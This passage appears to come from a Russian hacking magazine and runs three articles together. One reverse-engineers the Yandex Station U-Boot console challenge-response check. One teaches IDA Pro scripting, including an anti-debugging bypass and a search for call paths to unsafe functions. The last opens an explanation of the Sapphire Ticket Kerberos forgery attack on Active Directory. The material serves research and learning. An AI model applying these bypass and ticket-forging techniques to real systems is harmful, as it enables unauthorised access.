и соберет всю нужную информацию в свою базу (SQLite), чтобы сравнить с U-
Boot версии «Яндекса».





Процесс может слегка затянуться: моему MacBook Air десятилетней давности
потребовалось около 30 минут на каждую из прошивок (собранную и в
исполнении «Яндекса»).





После завершения индексации необходимо вернуться к прошивке «Яндекса»
и повторно запустить плагин. На этот раз в строке базы сравнения следует
указать SQLite-базу, созданную при индексации скомпилированного U-Boot.
Внимание: не запускай повторную индексацию! Если согласиться, то плагин
снова выполнит ту же работу и ты зря потратишь еще полчаса.





                                Загрузка базы





                        Отказ от повторной индексации

После сканирования плагин выдаст несколько вкладок с результатами:
 • Best matches — наиболее точно совпадающие функции;
 • Partial matches — более‑менее совпадающие функции с небольшими
   отличиями  (степень  совпадения  помечена  цветом: ярко‑зеленый —
   высокое, темно‑фиолетовый — низкое);
 • Problematic matches — плохо совпадающие результаты;
 • Unmatched — несколько вкладок полностью уникальных функций.





                                  Результат работы





                         Низкая степень совпадения

Сначала переходим на вкладку с полностью совпадающими функциями,
выделяем их и импортируем в проект — после этого база IDA будет обновле‐
на. Затем  открываем  вкладку  Partial и с  осторожностью  импортируем
еще часть функций — я, например, использую только те, что подсвечены
зеленым. Желательно просматривать содержимое перед импортом, чтобы
не затянуть лишнего. Остальные вкладки можно не трогать — они нас
не интересуют.





После импорта в исследуемом U-Boot появились осмысленные имена фун‐
кций и переменных.





Для получения более полного результата можно собрать и проиндексировать
другие версии U-Boot — каждая из них потенциально может помочь обра‐
ботать новые функции. Никаких гарантий нет, но иногда такой подход поз‐
воляет значительно дополнить базу.
  Я ограничился одним проходом и перешел к следующему плагину —
FindCrypt . Он ищет криптографические константы — это поможет определить
алгоритмы шифрования. Найдя некоторые константы, плагин автоматически
переименует их в соответствии с назначением.


Теперь уже точно анализ
Итак, в Rabbit Hole пять функций:
 • sub_EDC96CC ;
 • sub_EDC1BBC ;
 • sub_EDC1B74 ;
 • sub_EDC1A14 ;
 • sub_EDC9734 .

К сожалению, собранный мной U-Boot и проведенные манипуляции не дали
им имен. Возможно, я использовал неподходящую версию исходников —
или же в «Яндексе» написали часть кода самостоятельно. В итоге я стал раз‐
бирать каждую функцию вручную — анализировал их поведение, обращал
внимание на используемые строки и на основе этого присваивал имена:
 • sub_EDC96CC — challenge_gen ;
 • sub_EDC1BBC — print ;
 • sub_EDC1B74 — getconsole ;
 • sub_EDC1A14 — getc ;
 • sub_EDC9734 — challenge_chk .

Рассмотрим только первую и последнюю.


challenge_gen
bool __fastcall challenge_gen(unsigned __int64 a1)
{
  int v2; // w20
  int v3; // w21
  int v4; // w22
  int v5; // w0


  v2 = sub_EE2218C();
  v3 = sub_EE2218C();
  v4 = sub_EE2218C();
  v5 = sub_EE2218C();
  return string_format(a1, "%08X%08X%08X%08X", v2, v3, v4, v5) == 32;
}


bool __fastcall challenge_chk(const uint8_t *a1, __int64 a2)
{
  sha256_context ctx;


  sha256_starts(&ctx);
  sha256_update(&ctx, a1, 0x20u);
  sha256_finish(ctx.total, 0xEE89720);
  return sub_EE0EBA8(&dword_EE370C0, a2, 0x100u, 0xEE89720, &
unk_EE593E0) == 0;
}

Анализ первой функции и вызова sub_EE2218C() показал, что в регистре a1
формируется challenge — я сразу переименовал его соответствующим обра‐
зом. Запрос каждый раз получается уникальным, поскольку для его создания
используется аппаратный генератор случайных чисел. Это подтверждается
содержимым функции sub_EE2218C() , где единственная строка — return
MEMORY[0xFF634018]; . Согласно документации на A113X, этот адрес дей‐
ствительно принадлежит области RNG.





Можем предположить, что функция challenge_gen принимает указатель
на буфер, в который нужно записать запрос в виде строки с шестнадцатерич‐
ным представлением. В качестве результата функция возвращает длину
сформированной строки в байтах.


result = challenge_gen(challenge);
  if ( result )
  {
    while ( get_console() )
      getc();
    print("RH challenge: %s\n", challenge);

С challenge_chk повезло немного больше — почти все функции в этой
области уже получили осмысленные имена. По ним сразу становится ясно,
что для хеширования входных данных используется SHA-256, а полученный
хеш затем передается в sub_EE0EBA8 . Заглянем в нее.


bool __fastcall challenge_chk(const uint8_t *a1, __int64 a2)
{
  sha256_context ctx; // [xsp+38h] [xbp+38h] BYREF


  sha256_starts(&ctx);
  sha256_update(&ctx, a1, 0x20u);
  sha256_finish(ctx.total, 0xEE89720);
  return sub_EE0EBA8(&dword_EE370C0, a2, 0x100u, 0xEE89720, &
unk_EE593E0) == 0;
}




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
  В КРОЛИЧЬЕЙ НОРЕ
             ШТУРМУЕМ ОТЛАДОЧНУЮ
          КОНСОЛЬ «ЯНДЕКС СТАНЦИИ»




В коде этой функции видны какие‑то преобразования, но имен тоже нет.
Ныряем в каждую номерную функцию и пробуем найти намеки на то, что она
делает.


__int64 __fastcall sub_EE0EBA8(int *a1, const void *a2, unsigned int
a3, const void *a4, __int64 a5)
{


  v5 = *a1;
  v7 = *a1 - 2048;
  result = 0xFFFFFFF2LL;
  if ( v7 <= 0x800 )
  {
    v9 = v5 >> 5;
    sub_EE0E8B0(&v14, *(a1 + 1), v9);
    sub_EE0E8B0(&v14, *(a1 + 2), v9);
    v15[0] = v9;
    v15[1] = a1[1];
    v18 = *(a1 + 3);
    v16 = &v14;
    v17 = &v14;
    return sub_EE0E8E4(v15, a2, a3, a4, a5);
  }
  return result;
}

Итак, sub_EE0E8B0 «переворачивает» байты входного массива и складывает
в другой.
   Назовем ее array_bswap32 . Возможно, она нам еще где‑то встретится
и не придется повторно в ней копаться.


__int64 __fastcall sub_EE0E8B0(__int64 result, __int64 a2, int a3)
{
  __int64 i; // x3


  for ( i = 0; a3 > i; ++i )
    *(result + 4 * i) = bswap32(*(a2 + 4LL * a3 - 4 * i - 4));
  return result;
}

С функцией sub_EE0E8E4 нам повезло не так, она уже имеет разветвленную
структуру, видно много операций над данными. При изучении листинга я
зацепился взглядом за функцию subM — ее имя появилось в результате
работы Diaphora. Берем это имя и пробуем искать его в исходниках U-Boot
от Khadas, которые мы компилировали.





Как видим, эта функция встречается только в файле avb_rsa.с , нам очень
повезло!





Подробно изучаем этот файл и сверяем с тем, что видим в IDA. В результате я
наткнулся на вызов avb_rsa_verify . Эта функция очень напоминает начало
sub_EE0E8E4 .





__int64 __fastcall sub_EE0E8E4(unsigned int *a1, const void *a2,
unsigned int a3, const void *a4, __int64 a5)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]


  if ( !a1 || !a2 || !a4 || !a5 )
    return 0xFFFFFFFBLL;
  if ( 4LL * *a1 != a3 || a3 > 0x200 )
    return 0xFFFFFFEALL;

Очень похожая  проверка в начале, но при этом  тестовые сообщения
не выводятся, просто возвращаются коды ошибок: всё, что не 0, — плохо.
Идем дальше и находим больше сходств, поэтому возвращаемся на пару
уровней вверх и даем название функции sub_EE0EBA8 : rsa_yndx . Теперь
функция проверки ответа выглядит так:


bool __fastcall challenge_chk(const uint8_t *a1, __int64 a2)
{
  sha256_context ctx; // [xsp+38h] [xbp+38h] BYREF


  sha256_starts(&ctx);
  sha256_update(&ctx, a1, 0x20u);
  sha256_finish(ctx.total, 0xEE89720);
  return rsa_yndx(&dword_EE370C0, a2, 0x100u, 0xEE89720, &unk_EE593E0
) == 0;
}

Здесь
 • dword_EE370C0 — содержит открытую часть ключа RSA;
 • a2 — ответ (который мы вводим);
 • 0x100u — размер проверяемых данных;
 • 0xEE89720 — ячейка памяти, содержащая SHA-256 от challenge;
 • unk_EE593E0 — должно быть padding.

Глядя  на  прототип  avb_rsa_verify ,  можно  сопоставить  параметры
rsa_yndx : они не выглядят один в один, но анализ позволит полностью их
сверить.


bool avb_rsa_verify(const uint8_t* key,
                    size_t key_num_bytes,
                    const uint8_t* sig,
                    size_t sig_num_bytes,
                    const uint8_t* hash,
                    size_t hash_num_bytes,
                    const uint8_t* padding,
                    size_t padding_num_bytes)

В  этом  же  файле   встречается  функция  с  говорящим  названием
array_bswap32 , в которой реализован алгоритм так называемого перево‐
рачивания — побайтовой перестановки в 32-битных словах. Прослеживаем,
где она вызывается и какую роль играет в обработке данных.





Собираем всё воедино. При попытке входа в консоль U-Boot Rabbit Hole
генерирует текстовый запрос (challenge). Пользователь должен подписать
этот запрос своей закрытой частью RSA-ключа и ввести полученную подпись
обратно в консоль. Далее вызывается функция rsa_yndx , которая проверяет
подпись по аналогии с avb_rsa_verify , используя алгоритм RSA-2048.
В случае успешной проверки функция возвращает 0.


/* Verify a RSA PKCS1.5 signature against an expected hash.
 * Returns false on failure, true on success.
 */

Мы рассмотрели основные механизмы Rabbit Hole. Остальные части доволь‐
но простые, привожу листинг c комментариями:


bool Rabbit Hole()
{
  result = challenge_gen(challendge);
  if ( result )
  {
    while ( get_console() )
      getc();
    // Печатаем запрос
    print("RH challenge: %s\n", challendge);
    v1 = 0;
    // Печатаем приглашение и ожидаем 344 символа ответа
    print("RH response:\n");
    while ( v1 != 344 )
    {
      v2 = getc();
      // Если не пробел, то сохраняем в буфер
      if ( (ctype[v2] & 0x20) == 0 )
        // Проверяем введенные символы, если они из ASCII-таблицы,
то помещаем в буфер 0xEE89470
        *(0xEE89470 + v1++) = v2;
    }
    v3 = 0;
    v4 = 0;
    v5 = 0;
    // Теперь прогоняем каждый введенный символ
    while ( v3 != 344 )
    // Сравниваем с таблицей Base64
    {
      v6 = 0;
      while ( 1 )
      {
        v7 = v6;
        // Base64_table найден FindCrypt
        if ( Base64_table[v6] == *(v3 + 0xEE89470) )
          break;
        if ( ++v6 == 64 )
        {
          v7 = 64;
          break;
        }
      }
      v8 = (v5 + 1);
      v12[v5 + 4048] = v7;


   // Продолжаем преобразование Base64 в двоичный вид
   if ( v8 == 4 )
 {
        v9 = v13;
        v10 = v4 + 1;
        *(0xEE89740LL + v4) = 4 * (v12[4048] & 0x3F) + (v13 >> 4);
        v11 = v14;
        if ( v14 != 64 )
        {
          *(0xEE89740LL + v10) = 16 * (v9 & 0xF) + (v14 >> 2);
          v10 = v4 + 2;
        }
        v4 = v10;
        if ( v15 != 64 )
        {
          v4 = v10 + 1;
          *(0xEE89740LL + v10) = v15 + (v11 << 6);
        }
        v8 = 0;
      }
      ++v3;
      v5 = v8;
    }
    // Запускаем проверку подписи
    return challenge_chk(challendge, 0xEE89740);
  }
  return result;
}

Вот полный алгоритм авторизации:
 1. При загрузке системы нажимаем Enter или Ctrl-C, что провоцирует вызов
   Rabbit Hole.
 2. Генерируется случайный запрос, который выводится в консоль.
 3. Пользователь должен подписать запрос закрытой частью RSA-ключа, пре‐
   образовать в Base64.
 4. Дальше вводим ответ в виде Base64, который преобразует его в бинарный
   вид и отправляет на проверку в challenge_chk .
 5. Если результат проверки совпал, то попадаем в интерактивный режим U-
   Boot.

Скриншот с примером привожу для «Станции Max».





                       Пример от «Станции Max»

Мне удалось получить доступ к этой консоли — как и некоторым моим зна‐
комым. Однако, если пароль уже установлен, попасть в консоль становится
заметно сложнее.





                              Список команд


ВЫВОДЫ

Инженеры «Яндекса» в  части защиты консоли U-Boot применили очень
надежный алгоритм, не позволяющий получить вход даже при наличии рас‐
шифрованной прошивки, — асимметричный RSA-2048 со случайными вход‐
ными данными. Брутфорс тут бессилен, еще и попытка ввода только одна —
неверный ответ перезагружает устройство, и запрос будет уже новый. В лоб
Rabbit Hole не обходится.
   Зато по дороге я создал инструмент для извлечения BL33 и выяснил,
как защищена прошивка. Надеюсь, и ты тоже почерпнул что‑то для себя
полезное.
  Я не профессиональный реверсер, скорее —  увлеченный любитель.
Это мой первый подобный опыт, и, если я где‑то напорол чуши, не стесняйся
и расскажи мне об этом!
ВЗЛОМ





Управляющие  отладчиком  плагины  поз‐
воляют свалить на машину рутинные задачи
отладки и поиска уязвимостей. Мы на при‐
мерах  рассмотрим  обход  антиотладки,
поиск путей до уязвимых функций и под‐          mr.grogrig@gmail.commr.grogrig
светку  интересующего  кода.  Для  этого
напишем  плагин на C++, глянем  встро‐
енный язык IDC и попрактикуемся писать
скрипты на  IDAPython, а  также  узнаем,
как  обрабатывать им  несколько  файлов
за раз.


             INFO

                           Горячо рекомендую книгу Криса Игла «The IDA Pro
                        Book». Она устарела по части API, но отвечает
                       на большинство вопросов.



ПЛАГИН НА C++

Первый способ расширить возможности «Иды» — это компилируемые DLL.
Для сборки плагина требуется C++ SDK. Легально скачать его можно, только
купив лицензию на IDA Pro, о нелегальных способах ты можешь узнать сам.
   Попробуем  собрать  и  запустить  тестовый  плагин  в  Visual  Studio
2019 или выше. Создаем пустой проект для Windows (не для консоли), ука‐
зываем тип конфигурации — динамическая библиотека. В дополнительные
каталоги включаемых файлов прописываем путь до  папки с инклудами:
idasdk90\include . Подключаемые либы из idasdk90\lib\x64_win_vc_64
можно просто перетащить в список файлов проекта, компилятор подхватит их
оттуда.


#define WIN32_LEAN_AND_MEAN
#include <windows.h>


#include <ida.hpp>
#include <idp.hpp>
#include <loader.hpp>
#include <funcs.hpp>


class MyPlugmod : public plugmod_t
{
public:


    MyPlugmod()
    {
        msg("MyPlugmod: Constructor called.\n");
    }


    virtual ~MyPlugmod()
    {
        msg("MyPlugmod: Destructor called.\n");
    }


    virtual bool idaapi run(size_t arg) override
    {
        msg("MyPlugmod.run() called with arg: %d\n", arg);


        int n = get_func_qty();
        for (int i = 0; i < n; i++) {
            func_t* pfn = getn_func(i);
            if (pfn == nullptr)
                continue;


            qstring name;
            get_func_name(&name, pfn->start_ea);
            msg("Function %s at address 0x%llX\n", name.length() ?
name.c_str() : "-UNK-", pfn->start_ea);
        }


        return true;
    }
};


static plugmod_t* idaapi init(void)
{
    return new MyPlugmod();
}


static const char comment[] = "The plugin displays a list of
functions along with the addresses.";
static const char help[] = "Information is not provided";
static const char wanted_name[] = "List functions";
static const char wanted_hotkey[] = "Ctrl+Q";


plugin_t PLUGIN =
{
  IDP_INTERFACE_VERSION,
  PLUGIN_MULTI,         // flags
  init,                 // initialize
  nullptr,              // terminate
  nullptr,              // invoke the plugin
  comment,
  help,
  wanted_name,
  wanted_hotkey
};

Архитектура  стандартная. В  экспорте  указывается  ссылка на  структуру
PLUGIN. Она содержит описание плагина, желаемую горячую клавишу и ссыл‐
ки на  колбэки. Функция init возвращает  ссылку на экземпляр  класса
MyPlugmod. Он содержит функцию run, которая будет запущена при вызове
плагина. Код колбэка получает количество распознанных «Идой» функций
через get_func_qty и проходит по каждой, чтобы получить ее имя (через
getn_func) и адрес начала. После чего выводит собранную информацию
в консоль.
   Копируем собранный  плагин в  папку IDA  Professional  9.0  SP1\
plugins . Теперь в меню Edit → Plugins появится новый пункт List functions.
Как вариант, плагин можно вызывать через указанное в нем сочетание кла‐
виш Ctrl-Q.


Проблемы совместимости
Ключевая проблема плагинов — крайне низкая совместимость между ста‐
рыми и новыми версиями SDK. Плагин, собранный с учетом одной версии,
скорее всего, не заработает (и не соберется без танцев с бубном) на слегка
обновленном SDK. То есть для каждого выпуска IDA Pro надо модифициро‐
вать и собирать свою версию плагина. Этим, разумеется, никто не занима‐
ется. Поэтому многие плагины со временем стали недоступны.
   У этого подхода есть коммерческий интерес. SDK предоставляет крайне
скупую документацию, фактически только имена аргументов и функций. Чтобы
узнать детали работы  конкретной функции  API, надо искать чужой код
или обращаться в поддержку, доступ к которой стоит немалых денег. Можно
сказать, что потеря совместимости — своего рода защита от пиратства.
Жаль, что от нее страдает конечный пользователь.


IDC

Поддержка скриптов на языке IDC появилась со второй версии IDA Pro,
в 1994 году.
   IDC — это С‑подобный язык без строгой типизации. Но в отличие от С
в нем нет ссылок, все аргументы передаются по значению. Язык поддержи‐
вает большинство сишных выражений, за исключением += . Пользовательские
функции объявляются через ключевое слово static. Библиотечные функции
документированы , но дают меньше контроля, чем C++ SDK. Здесь есть
исключения, классы и синтаксический сахар вроде склейки двух строк через +
и получения подстроки через срезы str[0:2] .


#include <idc.idc>


static main()
{
  auto ea,x;


  for ( ea=get_next_func(0); ea != BADADDR; ea=get_next_func(ea) )
  {
    msg("Function at %08lX: %s", ea, get_func_name(ea));
    x = get_func_flags(ea);
    if ( x & FUNC_NORET ) msg(" Noret");
    if ( x & FUNC_FAR   ) msg(" Far");
    msg("\n");
  }
}

Код аналогичен примеру из прошлого раздела. Он получает ea (Effective
Address) первой функции через get_next_func . И продолжает в цикле спра‐
шивать адреса следующих функций, пока API не вернет константу BADADDR .
Имя функции возвращает get_func_name , флаги с метаданными берутся
из get_func_flags . Тот же msg выводит данные в консоль.
   Главное  достоинство  скриптов на IDC —  поддержка «из  коробки».
В остальном они фатально  устарели. Раньше все серьезные решения
писались на C++ SDK, однако, судя по публичным репозиториям, сегодня
плагины и одноразовые скрипты пишутся преимущественно на Python.


IDAPYTHON

Этот плагин добавляет в IDA Pro поддержку кода на Python. Первый релиз
проекта состоялся в 2004 году. Его автор Dyce (Гергей Эрдейи) разработал
плагин на деньги своего тогдашнего работодателя — финской компании F-
Secure, выпускающей одноименный антивирус. В середине 2010 года из‑за
нехватки времени на разработку проект был передан во владение Hex-Rays.
Поддержкой IDAPython по сей день занимается их сотрудник 0xeb (Элиас
Бачалани). Начиная с версии 5.4, плагин стал частью IDA Pro.
  На сегодняшний день IDAPython — основной язык, на котором пишутся
новые и на который переносят старые плагины. Свою роль в этом сыграли
озвученные выше проблемы обратной совместимости. Да и с документацией
дела обстоят немного лучше.
  Код на IDAPython позволяет делать то же самое, что C++ SDK. Нетрудно
заметить, что имена функций совпадают. Фактически IDAPython — это тонкая
и удобная обертка для низкоуровневых API. Поэтому на IDAPython можно
писать загрузчики для неизвестных форматов файлов или плагины с поддер‐
жкой собственных окон в графическом интерфейсе.


import idaapi
import idautils
import idc


class ListFunctionsPlugin(idaapi.plugin_t):
    flags = idaapi.PLUGIN_UNL
    comment = "The plugin displays a list of functions along with
the addresses."
    help = "Information is not provided"
    wanted_name = "List Functions v2"
    wanted_hotkey = "Alt-F8"


    def init(self):
        print("[ListFunctionsPlugin] Constructor called.")
        return idaapi.PLUGIN_OK


    def run(self, arg):
        for func_ea in idautils.Functions():
            func_name = idc.get_func_name(func_ea)
            print(f"0x{func_ea:08X}: {func_name}")


    def term(self):
        print("[ListFunctionsPlugin] Destructor called.")



def PLUGIN_ENTRY():
    return ListFunctionsPlugin()

По традиции рассмотрим плагин, выводящий список функций. Поместив код
в папку IDA Professional 9.0 SP1\plugins и перезапустив «Иду», получа‐
ем новый пункт в меню — List Functions v2. Как вариант, плагин можно запус‐
тить, нажав Alt-F8.
   Получился полный аналог плагина на C++, с той разницей, что в Python
есть удобные обертки из библиотеки idautils , которые сообщают нам спи‐
сок адресов функций. Имя get_func_name нам знакомо по прошлому при‐
меру. Вместо структуры PLUGIN здесь используются поля класса, наследу‐
емого от idaapi.plugin_t . В классе три заранее определенных функции:
конструктор, деструктор и run — функция, содержащая код, запускаемый
при вызове плагина.


ПИШЕМ СКРИПТЫ НА IDAPYTHON

Покажу несколько примеров того, как можно облегчить себе жизнь, используя
IDAPython. Скрипты с диска запускаются через File → Script File, короткие
скрипты из буфера обмена можно запустить через File → Script Command.


Подсветка CALL
import idautils
import idc


CALL_COLOR = 0xFFDDCC


for seg_ea in idautils.Segments():
    for head in idautils.Heads(seg_ea, idc.get_segm_end(seg_ea)):
        if idc.is_code(idc.get_full_flags(head)):
            mnem = idc.print_insn_mnem(head)
            if mnem.lower() == "call":
                idc.set_color(head, idc.CIC_ITEM, CALL_COLOR)

После запуска скрипта видим, что все строчки с инструкцией CALL теперь
выделены бледно‑синим.
   Функция idautils.Segments() возвращает список сегментов — адресов
начала каждой секции в PE32. Далее idautils.Heads возвращает все эле‐
менты внутри обозначенных адресов. Это может быть код или данные. Про‐
веряем, что элемент является кодом, через idc.is_code . Получаем мне‐
монику из инструкции через idc.print_insn_mnem и сравниваем ее с иско‐
мой CALL . И наконец, idc.set_color раскрашивает элемент заданным цве‐
том. Цвета задаются в формате BBGGRR, то есть, чтобы сделать чисто синий,
надо написать FF0000.


Подмена результатов WinAPI
Попробуем обойти простейшую антиотладку. Допустим, программа срав‐
нивает результат IsDebuggerPresent с единицей. Правильнее всего было бы
стереть флаг BeingDebugged из PEB (Process Environment Block), но, чтобы
сделать пример интереснее, попробуем подменять результат WinAPI на ходу.


import idc
import idaapi


IAT_NAME = "__imp__IsDebuggerPresent@0"
RETURN_VALUE = 0
global_hook = None


class ExitHook(idaapi.DBG_Hooks):
    def __init__(self, target_addr):
        super().__init__()
        self.target_addr = target_addr
        self.ret_addr = None


    def dbg_bpt(self, tid, ea):
        print(f"[+] Breakpoint hit at 0x{ea:X}")


        if ea == self.target_addr:
            esp = idc.get_reg_value("esp")
            print(f"[+] ESP: 0x{esp:X}")
            self.ret_addr = idc.get_wide_dword(esp)
            print(f"[+] Captured return address: 0x{self.ret_addr:X}"
)
            idc.add_bpt(self.ret_addr)


        elif self.ret_addr and ea == self.ret_addr:
            print(f"[+] Return point hit. Overwriting EAX with {
RETURN_VALUE}")
            idc.set_reg_value(RETURN_VALUE, "EAX")
            idc.del_bpt(self.ret_addr)
            self.ret_addr = None


        return 0


def setup_hook():
    global global_hook


    imp_ptr = idc.get_name_ea_simple(IAT_NAME)
    if imp_ptr == idc.BADADDR:
        print(f"[-] Import {IAT_NAME} not found.")
        return


    target_addr = idc.get_wide_dword(imp_ptr)
    print(f"[+] Real ExitProcess address: 0x{target_addr:X}")


    idc.add_bpt(target_addr)


    global_hook = ExitHook(target_addr)
    global_hook.hook()
    print("[+] Hook installed. Start or resume process (F9).")


setup_hook()

Проще    всего   (через   idc.get_name_ea_simple )   получить   ссылку
на IAT_NAME — четыре байта в секции импорта, в которые загрузчик запишет
целевой адрес вызываемой функции WinAPI. Далее берем актуальный адрес
функции, используя idc.get_wide_dword , и ставим на него точку останова
при помощи idc.add_bpt .
  Для создания хука  используется класс ExitHook , который  наследует
idaapi.DBG_Hooks. Это современный способ ставить хуки на разные отла‐
дочные события, в том числе и на точки останова. Хитрость в том, что экзем‐
пляр  класса  должен  быть  глобальным,  если  создать  его  локально
в setup_hook , то сборщик мусора удалит его в момент завершения функции.
IDA ничего не скажет, но установленный хук не сработает.
  В обработчике точек останова dbg_bpt проверяем, что мы остановились
по адресу перехватываемой WinAPI, и получаем из стека адрес возврата. Ста‐
вим на него вторую точку останова. Когда она срабатывает, подменяем зна‐
чение регистра EAX нолем, больше не нужный хук удаляем.


#include <windows.h>


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    if (IsDebuggerPresent())
    {
        MessageBoxA(0, "debugger", "!", 0);
    }
}

Запустив скрипт при старте тестового приложения, убеждаемся, что хук
работает: IsDebuggerPresent возвращает ноль и сообщение не отобража‐
ется.


Поиск путей до небезопасных функций
Если в импорте обнаружены функции, потенциально ведущие к перепол‐
нению буфера, стоит проверить, можно ли передать в них пользовательские
данные. Для  этого нужно составить граф, пройдя от заданной функции
до всех тех, что ее вызывают, всех, которые вызывают их, и так далее
до самого верхнего уровня.


import idautils
import idc
import idaapi
import ida_funcs
from collections import defaultdict


IMPORT_NAME = "lstrcpyW"


callers_map = defaultdict(set)
calls_to_func = []


def get_func_name(ea):
    return idc.get_func_name(ea) or f"sub_{ea:X}"


def get_func_start_ea(ea):
    f = ida_funcs.get_func(ea)
    return f.start_ea if f else ea


def find_import_address():
    ea = idc.get_name_ea_simple(IMPORT_NAME)
    if ea == idc.BADADDR:
        print(f"[-] Import {IMPORT_NAME} not found.")
        return None
    print(f"[+] Found {IMPORT_NAME} import at: 0x{ea:X}")
    return ea


def find_calls_to_import(imp_addr):
    print("[*] Scanning for calls to imported function...")
    for func_ea in idautils.Functions():
        for insn_ea in idautils.FuncItems(func_ea):
            if idc.print_insn_mnem(insn_ea).lower() != "call":
                continue
            op_type = idc.get_operand_type(insn_ea, 0)
            if op_type in [idc.o_mem, idc.o_displ]:
                target = idc.get_operand_value(insn_ea, 0)
                if target == imp_addr:
                    calls_to_func.append(func_ea)
                    callers_map[imp_addr].add(func_ea)
    print(f"[+] Found {len(calls_to_func)} direct callers of {
IMPORT_NAME}")


def build_call_graph():
    print("[*] Building global call graph...")
    for func_ea in idautils.Functions():
        for insn_ea in idautils.FuncItems(func_ea):
            if idc.print_insn_mnem(insn_ea).lower() != "call":
                continue
            target = idc.get_operand_value(insn_ea, 0)
            if ida_funcs.get_func(target):
                callers_map[target].add(func_ea)


def build_paths(target_ea, path=None, visited=None):
    if path is None:
        path = []
    if visited is None:
        visited = set()


    path = [target_ea] + path
    visited.add(target_ea)


    if target_ea not in callers_map or not callers_map[target_ea]:
        yield path
    else:
        for caller in callers_map[target_ea]:
            if caller not in visited:
                yield from build_paths(caller, path, visited.copy())


def print_path_tree(path):
    for depth, ea in enumerate(path):
        print("  " * depth + f"- {get_func_name(ea)}")


def main():
    imp_addr = find_import_address()
    if not imp_addr:
        return


    find_calls_to_import(imp_addr)
    build_call_graph()


    print("\n[+] All unique call paths to lstrcpyW:\n")


    seen_paths = set()


    for caller in calls_to_func:
        for path in build_paths(caller):
            norm_path = tuple(get_func_start_ea(ea) for ea in path)
            if norm_path not in seen_paths:
                seen_paths.add(norm_path)
                print_path_tree(path)


    if not seen_paths:
        print("[-] No paths found.")


main()

Вкратце объясню, что здесь происходит. Функция find_calls_to_import
составляет  карту вызовов — запоминает все  места,  откуда вызывается
lstrcpyW . Дальше build_call_graph продолжает строить карту, проходя
по всем функциям и собирая все вызовы. Наконец, из полученных данных
build_paths строит все возможные пути до искомого адреса. Код верхнего
уровня фильтрует полученные пути, чтобы выводить только уникальные ком‐
бинации.
   Запускаем скрипт и смотрим результат его работы:



  [+] Found lstrcpyW import at: 0x5A9170
  [*] Scanning for calls to imported function...
  [+] Found 13 direct callers of lstrcpyW
  [*] Building global call graph...


  [+] All unique call paths to lstrcpyW:


  - sub_48CCA0
  - sub_490F90
  - sub_48D020
  - sub_41B820


  - sub_48CCA0
  - sub_490F90
  - sub_48D020


  - ?__scrt_common_main_seh@@YAHXZ
  - _WinMain@16
  - sub_525BB0


Уникальных вызовов тринадцать штук, но все сделаны из трех функций.


МАССОВОЕ ИСПОЛНЕНИЕ

IDA Pro имеет встроенное управление из командной строки. Достаточно
запустить ее в headless-режиме, то есть без отображения графики, сменив
ida64.exe на idat64.exe:



  idat64.exe -A -S"path\to\script.py" path\to\target.exe


Ключ -A запускает IDA в автономном режиме, без диалоговых окон. Ключ -S
указывает путь до скрипта. Далее идет путь до исследуемого файла.


import ida_auto
import idc


ida_auto.auto_wait()


with open("result.txt", "w") as f:
    f.write("something")


idc.qexit(0)

Запускаемый скрипт должен дождаться конца анализа, для этого использует‐
ся ida_auto.auto_wait. Результат работы скрипта записывается во внешний
файл. После чего завершаем работу IDA.


ЗАКЛЮЧЕНИЕ

Скрипты с доступом к внутренним API значительно расширяют возможности
«Иды», превращая ее из декомпилятора в любой необходимый инструмент,
будь то анализатор кода или ситуативно улучшенный отладчик. А запуск
из командной строки еще и делает ее оружием массового поражения вра‐
жеского кода!
ВЗЛОМ





Техники Diamond Ticket и Sapphire Ticket — новые направле‐
ния в развитии атак на Active Directory. «Сапфировый» вари‐
ант — это прокачанная версия «алмазного»: если Diamond
Ticket просто изменяет PAC, то Sapphire подставляет вместо
него PAC другого привилегированного пользователя. В этой
статье мы как следует разберем, как именно работают такие
атаки.


             INFO

                      Это перевод материала Sapphire Ticket Attack:
                        Abusing Kerberos Trust из блога Hacking Articles .
                       Автор — Комаль Сингх . Этот материал доступен
                       без платной подписки.


Итак, Sapphire Ticket работает по тому же принципу, что и Diamond: ата‐
кующий получает легальный TGT и копирует данные из его PAC в поддельный
тикет. Но тут есть одна хитрость: вместо того чтобы полагаться на PAC из пер‐
вичного аутентификатора, злоумышленник проводит отдельную операцию
для получения PAC другого пользователя — чаще всего с повышенными при‐
вилегиями.
   Алгоритм следующий:
 • Аутентификация через KDC (центр распределения ключей). Используя
   расширения S4U2Self и U2U, атакующий запрашивает TGS для поль‐
   зователя с высокими привилегиями. Так система создает PAC, который
   отображает реальные данные авторизации пользователя. Однако этот
   билет нельзя напрямую использовать в привилегированных контекстах.
 • Расшифровка данных PAC.
 • Изменение PAC таким образом, чтобы он соответствовал атрибутам нас‐
   тоящего TGT.
 • Шифрование поддельного билета с хешем KRBTGT.

Как и в случае с золотыми и алмазными билетами, чтобы создать сапфировый
билет, атакующему нужен хеш домена KRBTGT. Но здесь есть одна особен‐
ность: в отличие от остальных подобных атак, здесь не требуются DOMAIN_SID
и DOMAIN_RID . Вместо этого всю нужную инфу можно вытащить прямо из дей‐
ствительного TGT.


             INFO

                        Подробнее про  технику Diamond  Ticket  читай
                        в предыдущей статье того же автора: « Алмазный
                         билет. Как использовать доверие Kerberos в сво‐
                        их целях ».



ВАЖНЫЕ ТЕРМИНЫ

S4U2Self
Расширение S4U2Self  (буквально — «служба от  пользователя  к себе»)
для Kerberos позволяет сервису от имени пользователя запросить для себя
сервисный билет. В нем содержатся данные, удостоверяющие права поль‐
зователя, в частности Privilege Attribute Certificate (PAC). Именно на основе
этой инфы система потом решает, какой доступ давать.
   Чтобы воспользоваться S4U2Self, нужно, чтобы у пользователя, который
запрашивает, был зарегистрирован хотя бы один Service Principal Name
(SPN). Этот SPN позволяет контроллеру домена (DC) зашифровать сгенери‐
рованный сервисный тикет с помощью секретного ключа самого сервиса.


Процесс запроса токена S4U2Self
 1. Сервис создает структуру данных PA_FOR_USER , где указывает поль‐
   зователя, от имени которого хочет войти.
 2. Отправляет сообщение KRB_TGS_REQ на сервер выдачи билетов (TGS).
 3. TGS (Ticket Granting Service) отвечает сервисным билетом, в котором
   лежит PAC пользователя, зашифрованный для запрашиваемого сервиса.


U2U
Аутентификация User-to-User (U2U), или  «аутентификация  пользователей
